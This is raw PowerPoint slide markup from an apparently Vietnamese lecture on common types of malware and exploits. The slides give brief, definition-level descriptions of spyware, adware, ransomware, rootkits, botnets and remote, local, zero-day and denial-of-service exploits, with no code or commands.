                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Malware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. Spyware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Theo dõi hoạt động người dùng, ghi lại phím bấm, lịch sử duyệt web.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Thường thu thập dữ liệu cá nhân, mật khẩu, thông tin tài chính.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>5. Adware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Hiển thị quảng cáo không mong muốn.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Có thể đi kèm spyware để theo dõi thói quen người dùng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ít nguy hiểm hơn virus/trojan nhưng gây phiền toái.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>6. Ransomware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Mã hóa dữ liệu trên máy nạn nhân, yêu cầu trả tiền chuộc để mở khóa.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Gây thiệt hại tài chính lớn cho cá nhân và tổ chức.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ví dụ: WannaCry, Petya.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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2665537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64502"/>
            <a:ext cx="10242645" cy="528851"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6.2.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loại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ã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độc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phổ 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53"/>
            <a:ext cx="10515601" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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loại</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Malware:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>7. Rootkit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ẩn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>mình trong hệ thống để che giấu hoạt động của hacker hoặc malware khác.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Khó bị phát hiện bởi phần mềm diệt virus thông thường.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Thường được dùng để duy trì quyền kiểm soát hệ thống.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>8. Botnet / Zombie</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Máy tính bị kiểm soát từ xa và trở thành “zombie”.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Bị điều khiển để tham gia tấn công DDoS, gửi spam hoặc phát tán malware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="vi-VN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>M</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>ỗi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF00FF"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>loại malware có đặc điểm và cơ chế tấn công riêng, nhưng điểm chung là đe dọa đến tính an toàn, toàn vẹn và bảo mật thông tin.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2573469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64502"/>
            <a:ext cx="10242645" cy="528851"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6.2.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loại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ã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độc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phổ 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53"/>
            <a:ext cx="10515601" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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loại</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> Exploit Code:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>1. Remote Exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tấn công từ xa, không cần quyền truy cập trực tiếp vào hệ thống.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ví dụ: khai thác lỗ hổng dịch vụ web, FTP, hoặc SQL Injection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>2. Local Exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Được thực thi trực tiếp trên máy đã bị xâm nhập.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Thường dùng để leo thang đặc quyền (privilege escalation), ví dụ khai thác lỗ hổng kernel để từ user thành admin/root.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>3. Zero-Day Exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Khai thác lỗ hổng chưa được công bố hoặc vá lỗi.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Đặc biệt nguy hiểm vì không có biện pháp phòng thủ kịp thời.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20426362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64502"/>
            <a:ext cx="10242645" cy="528851"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>6.2.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loại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ã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độc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phổ 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53"/>
            <a:ext cx="10515601" cy="4382729"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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loại</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Exploit Code:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="0000CC"/>
              </a:solidFill>
              <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
              <a:ea typeface="+mj-ea"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. Denial of Service Exploit (DoS Exploit)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Lợi dụng lỗ hổng để làm dịch vụ/nguyên hệ thống bị tê liệt.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Ví dụ: gửi nhiều gói tin gây tràn bộ nhớ, crash dịch vụ.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
